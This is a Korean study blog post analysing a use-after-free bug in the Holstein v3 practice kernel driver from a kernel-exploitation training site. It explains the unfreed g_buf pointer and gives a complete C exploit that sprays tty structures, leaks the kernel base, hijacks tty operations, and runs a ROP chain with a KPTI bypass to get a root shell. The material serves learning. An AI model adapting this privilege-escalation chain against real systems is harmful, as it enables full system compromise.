---
title: "[KERNEL] Heap Use After Free"
description: "※ 자료들을 참고하여 분석을 진행하였기에 잘못된 부분이 있을지도 모릅니다. ※ 보완 혹은 수정해야 되는 부분이 있다면 알려주시면 확인 후 조치하도록 하겠습니다. 이번에는 Holstein v3을 가지고 수행한다.https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-3.tar.g"
date: "2024-11-14"
translation_key: "tistory-21ae322697ad"
tags: ["STUDY/KERNEL"]
category: "STUDY/KERNEL"
source_url: "https://whrdud727.tistory.com/entry/KERNEL-Heap-Use-After-Free"
private: false
---

**※ 자료들을 참고하여 분석을 진행하였기에 잘못된 부분이 있을지도 모릅니다.** 

**※ 보완 혹은 수정해야 되는 부분이 있다면 알려주시면 확인 후 조치하도록 하겠습니다.**

이번에는 Holstein v3을 가지고 수행한다.

[https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-3.tar.gz](https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-3.tar.gz)

v2에서는 g\_buf를 kmalloc()을 사용하여 할당을 수행했었다.

v3으로 넘어오면서는 kzalloc()으로 할당을 수행하여 memory leak을 어느정도 방지를 수행했다.

```
g_buf = kzalloc(BUFFER_SIZE, GFP_KERNEL);
if (!g_buf) {
 printk(KERN_INFO "kmalloc failed");
 return -ENOMEM;
}
```

kzalloc()은 user 영역의 함수로 보면 calloc()과 같이 0으로 초기화를 수행한다.

g\_buf도 kzalloc으로 할당하고, module\_read(), module\_write()도 v2와 동일하게 안전한 함수들을 사용하는데 어느 부분에서 취약점이 발생할까?

v3에서는 메모리를 해제하는 부분에서 취약점이 발생하게 된다.

```
static int module_close(struct inode *inode, struct file *file)
{
 printk(KERN_INFO "module_close called\n");
 kfree(g_buf);
 return 0;
}
```

kfree()를 통해 메모리를 해제하지만 g\_buf에 대한 포인터는 초기화를 수행하지 않는다.

이렇게 되버리면 g\_buf는 해제된 이후에도 Heap 영역에 대한 데이터를 가지고 있게 된다.

이를 이용하여 해제된 메모리를 다시 사용하여 공격하는 UAF를 수행할 수 있게 된다.

```
int fd1 = open("/dev/holstein", O_RDWR);
int fd2 = open("/dev/holstein", O_RDWR);
close(fd1);
write(fd2, "Hello", 5);
```

Kernel은 프로세스들의 리소스가 공유된다는 점을 이용하여 위와 같이 작성한다.

이렇게 되면 fd1은 해제되었지만 fd2에 값을 쓰는 write()에 의해 데이터가 수정되게 된다.

이를 악용하여 원래의 함수 테이블을 fake func table 주소로 overwrite가 가능해지게 되어 Exploit이 가능해진다.

```
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/shm.h>
#include <sys/timerfd.h>
#include <unistd.h>

unsigned long kbase, g_buf, current;
unsigned long user_cs, user_ss, user_rsp, user_rflags;

#define ofs_tty_ops 0xc39c60
#define rop_push_rdx_xor_eax_415b004f_pop_rsp_rbp (kbase + 0x14fbea)
#define rop_pop_rdi (kbase + 0x14078a)
#define rop_pop_rcx (kbase + 0x0eb7e4)
#define rop_mov_rdi_rax_rep_movsq (kbase + 0x638e9b)
#define rop_bypass_kpti (kbase + 0x800e26)
#define addr_commit_creds (kbase + 0x0723c0)
#define addr_prepare_kernel_cred (kbase + 0x072560)

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int main() {
  save_state();

  int fd1 = open("/dev/holstein", O_RDWR);
  int fd2 = open("/dev/holstein", O_RDWR);
  if (fd1 == -1 || fd2 == -1)
    fatal("/dev/holstein");
  close(fd1);

  int spray[100];
  for (int i = 0; i < 50; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1) fatal("/dev/ptmx");
  }

  char buf[0x400];
  read(fd2, buf, 0x400);
  kbase = *(unsigned long*)&buf[0x18] - ofs_tty_ops;
  g_buf = *(unsigned long*)&buf[0x38] - 0x38;
  printf("kbase = 0x%016lx\n", kbase);
  printf("g_buf = 0x%016lx\n", g_buf);

  unsigned long *chain = (unsigned long*)&buf;
  *chain++ = rop_pop_rdi;
  *chain++ = 0;
  *chain++ = addr_prepare_kernel_cred;
  *chain++ = rop_pop_rcx;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq;
  *chain++ = addr_commit_creds;
  *chain++ = rop_bypass_kpti;
  *chain++ = 0xdeadbeef;
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;

  *(unsigned long*)&buf[0x3f8] = rop_push_rdx_xor_eax_415b004f_pop_rsp_rbp;

  write(fd2, buf, 0x400);

  int fd3 = open("/dev/holstein", O_RDWR);
  int fd4 = open("/dev/holstein", O_RDWR);
  if (fd3 == -1 || fd4 == -1)
    fatal("/dev/holstein");
  close(fd3);
  for (int i = 50; i < 100; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1) fatal("/dev/ptmx");
  }

  read(fd4, buf, 0x400);
  *(unsigned long*)&buf[0x18] = g_buf + 0x3f8 - 12*8;
  write(fd4, buf, 0x20);

  for (int i = 50; i < 100; i++) {
    ioctl(spray[i], 0, g_buf - 8); // rsp=rdx; pop rbp;
  }

  getchar();
  return 0;
}
```
